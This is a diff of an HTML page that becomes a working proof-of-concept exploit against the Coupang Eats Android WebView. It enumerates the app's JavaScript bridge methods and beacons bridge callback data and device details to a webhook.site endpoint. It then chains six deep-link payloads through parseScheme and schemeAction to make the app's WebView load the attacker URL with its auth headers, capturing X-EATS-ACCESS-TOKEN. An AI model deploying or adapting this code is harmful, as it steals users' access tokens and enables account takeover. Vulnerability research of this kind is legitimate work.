@@ -1,43 +1,227 @@
 <!DOCTYPE html>
 <html>
-<head><title>Method Output Audit</title></head>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:monospace;background:#111;color:#0f0;padding:10px;font-size:11px}
+        pre{white-space:pre-wrap;word-break:break-all}
+        .r{color:#f44}.g{color:#4f4}.y{color:#ff0}.w{color:#fff}
+    </style>
+</head>
 <body>
-    <script>
-        window.onload = function() {
-            let Results = {
-                deviceStatusOutput: "Not Called",
-                parseSchemeOutput: "Not Called",
-                updateUserPrefOutput: "Not Called"
-            };
-
-            if (typeof window.messageHandlers !== 'undefined') {
-                
-                // 1. Test deviceStatus()
-                try {
-                    if (typeof window.messageHandlers.deviceStatus === 'function') {
-                        Results.deviceStatusOutput = window.messageHandlers.deviceStatus();
-                    } else {
-                        Results.deviceStatusOutput = "Method not found or not a function";
-                    }
-                } catch(e) { Results.deviceStatusOutput = "Error: " + e.message; }
-
-                // 2. Test parseScheme() with a dummy string to see if it returns text
-                try {
-                    if (typeof window.messageHandlers.parseScheme === 'function') {
-                        Results.parseSchemeOutput = window.messageHandlers.parseScheme("test_string");
-                    } else {
-                        Results.parseSchemeOutput = "Method not found";
-                    }
-                } catch(e) { Results.parseSchemeOutput = "Error: " + e.message; }
-
-                // Send the actual return values of the functions to your webhook
-                fetch('https://webhook.site/a7bc9ca4-1f6a-459e-a5a6-253351c94e4e/', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(Results)
-                });
+<pre id="o"></pre>
+<script>
+var W = "https://webhook.site/a7bc9ca4-1f6a-459e-a5a6-253351c94e4e";
+var o = document.getElementById('o');
+function l(m,c){o.innerHTML += '<span class="'+(c||'')+'">' + m + '</span>\n';}
+ 
+l('══════════════════════════════════════════','y');
+l('  Coupang Eats PopupWebView Exploit PoC','y');
+l('══════════════════════════════════════════','y');
+l('');
+ 
+// ───────────────────────────────────────────────
+// PHASE 1: Detect JS bridges
+// ───────────────────────────────────────────────
+l('[Phase 1] Detecting JS bridges...','w');
+var hasBridge = false;
+var bridgeMethods = [];
+ 
+if (typeof window.messageHandlers !== 'undefined' && window.messageHandlers !== null) {
+    hasBridge = true;
+    l('  [+] messageHandlers: FOUND','g');
+    
+    var methods = ['parseScheme','schemeAction','close','deviceStatus',
+                   'hasAlarmPermission','updateUserPreference',
+                   'addLocalNotification','openExternalHTTP',
+                   'launchApp','gotoStore','openAppstore',
+                   'moveToNotificationSetting'];
+    methods.forEach(function(m){
+        try {
+            if(typeof window.messageHandlers[m] === 'function'){
+                bridgeMethods.push(m);
             }
-        };
-    </script>
+        }catch(e){}
+    });
+    l('  [+] Methods: ' + bridgeMethods.join(', '),'g');
+} else {
+    l('  [-] messageHandlers: NOT FOUND','r');
+}
+ 
+['eatsPopupWebViewHandlers','eatsWebEventHandlers',
+ 'eatsWebTrackingHandlers','CoupangAppTracking',
+ 'eatsDesignHandler','CoupangAppUtil'].forEach(function(b){
+    try {
+        if(typeof window[b] !== 'undefined' && window[b] !== null){
+            l('  [+] ' + b + ': FOUND','g');
+        }
+    }catch(e){}
+});
+ 
+l('');
+ 
+// ───────────────────────────────────────────────
+// PHASE 2: Exfil bridge data via callbacks
+// ───────────────────────────────────────────────
+l('[Phase 2] Setting up data capture...','w');
+ 
+window.__BRIDGE_CALLBACK = function(raw) {
+    l('');
+    l('[CALLBACK DATA RECEIVED]','g');
+    l('  ' + raw,'g');
+    
+    // Send to webhook
+    try {
+        navigator.sendBeacon(W, JSON.stringify({
+            type: 'bridge_callback',
+            data: raw,
+            timestamp: new Date().toISOString()
+        }));
+        l('  → Sent to webhook','g');
+    } catch(e){}
+    
+    try {
+        new Image().src = W + '?cb=' + encodeURIComponent(raw).substring(0,1500);
+    } catch(e){}
+};
+ 
+// Probe for data
+if (hasBridge) {
+    try {
+        window.messageHandlers.deviceStatus(JSON.stringify({callbackId:'ds_'+Date.now()}));
+        l('  [+] deviceStatus probe sent','g');
+    } catch(e){ l('  [-] deviceStatus: '+e,'r'); }
+    
+    try {
+        window.messageHandlers.hasAlarmPermission(JSON.stringify({callbackId:'ap_'+Date.now()}));
+        l('  [+] hasAlarmPermission probe sent','g');
+    } catch(e){}
+}
+ 
+l('');
+ 
+// ───────────────────────────────────────────────
+// PHASE 3: Chain → Open WebViewActivity with 
+//          attacker URL to capture auth headers
+// ───────────────────────────────────────────────
+l('[Phase 3] Launching auth token capture chain...','y');
+l('');
+l('  PopupWebViewActivity (here)','w');
+l('       │ JS bridge: parseScheme()','w');
+l('       ▼','w');
+l('  WebViewActivity opens','w');
+l('       │ loadUrl(webhook, AUTH_HEADERS)','w');
+l('       ▼','w');
+l('  webhook.site receives tokens','w');
+l('');
+ 
+if (hasBridge && bridgeMethods.indexOf('parseScheme') !== -1) {
+    
+    // Attempt 1: coupangeats://Web scheme
+    setTimeout(function(){
+        l('[Chain 1] coupangeats://Web ...','y');
+        try {
+            var url1 = "coupangeats://Web?url=" + encodeURIComponent(W + "?src=chain1_coupangeats_web");
+            l('  Scheme: ' + url1,'w');
+            window.messageHandlers.parseScheme(url1);
+            l('  [+] Sent!','g');
+        } catch(e){ l('  [-] Error: '+e,'r'); }
+    }, 800);
+    
+    // Attempt 2: eats://Web scheme  
+    setTimeout(function(){
+        l('');
+        l('[Chain 2] eats://Web ...','y');
+        try {
+            var url2 = "eats://Web?url=" + encodeURIComponent(W + "?src=chain2_eats_web");
+            l('  Scheme: ' + url2,'w');
+            window.messageHandlers.parseScheme(url2);
+            l('  [+] Sent!','g');
+        } catch(e){ l('  [-] Error: '+e,'r'); }
+    }, 2500);
+    
+    // Attempt 3: rocketnowcustomer://Web scheme
+    setTimeout(function(){
+        l('');
+        l('[Chain 3] rocketnowcustomer://Web ...','y');
+        try {
+            var url3 = "rocketnowcustomer://Web?url=" + encodeURIComponent(W + "?src=chain3_rocketnow_web");
+            l('  Scheme: ' + url3,'w');
+            window.messageHandlers.parseScheme(url3);
+            l('  [+] Sent!','g');
+        } catch(e){ l('  [-] Error: '+e,'r'); }
+    }, 4000);
+    
+    // Attempt 4: via schemeAction (different code path)
+    setTimeout(function(){
+        l('');
+        l('[Chain 4] schemeAction ...','y');
+        try {
+            var payload = JSON.stringify({
+                url: "coupangeats://Web?url=" + encodeURIComponent(W + "?src=chain4_schemeAction"),
+                callback: "__BRIDGE_CALLBACK"
+            });
+            l('  Payload: ' + payload,'w');
+            window.messageHandlers.schemeAction(payload);
+            l('  [+] Sent!','g');
+        } catch(e){ l('  [-] Error: '+e,'r'); }
+    }, 5500);
+ 
+    // Attempt 5: PopupWebview scheme (opens another popup webview)
+    setTimeout(function(){
+        l('');
+        l('[Chain 5] coupangeats://PopupWebview ...','y');
+        try {
+            var url5 = "coupangeats://PopupWebview?url=" + encodeURIComponent(W + "?src=chain5_popup");
+            l('  Scheme: ' + url5,'w');
+            window.messageHandlers.parseScheme(url5);
+            l('  [+] Sent!','g');
+        } catch(e){ l('  [-] Error: '+e,'r'); }
+    }, 7000);
+ 
+    // Attempt 6: eats://PopupWebview
+    setTimeout(function(){
+        l('');
+        l('[Chain 6] eats://PopupWebview ...','y');
+        try {
+            var url6 = "eats://PopupWebview?url=" + encodeURIComponent(W + "?src=chain6_eats_popup");
+            l('  Scheme: ' + url6,'w');
+            window.messageHandlers.parseScheme(url6);
+            l('  [+] Sent!','g');
+        } catch(e){ l('  [-] Error: '+e,'r'); }
+    }, 8500);
+ 
+    setTimeout(function(){
+        l('');
+        l('══════════════════════════════════════════','y');
+        l('[*] All chains fired.','y');
+        l('[*] Check webhook.site for requests with','y');
+        l('[*] X-EATS-ACCESS-TOKEN in headers.','y');
+        l('[*] Look at the "src" param to see which','y');
+        l('[*] chain succeeded.','y');
+        l('══════════════════════════════════════════','y');
+    }, 10000);
+ 
+} else {
+    l('[-] parseScheme not available, cannot chain','r');
+}
+ 
+// ───────────────────────────────────────────────
+// Also send confirmation that this page loaded
+// ───────────────────────────────────────────────
+try {
+    navigator.sendBeacon(W, JSON.stringify({
+        type: 'exploit_page_loaded',
+        source: 'PopupWebViewActivity',
+        bridges_found: hasBridge,
+        methods: bridgeMethods,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent
+    }));
+} catch(e){}
+</script>
 </body>
 </html>
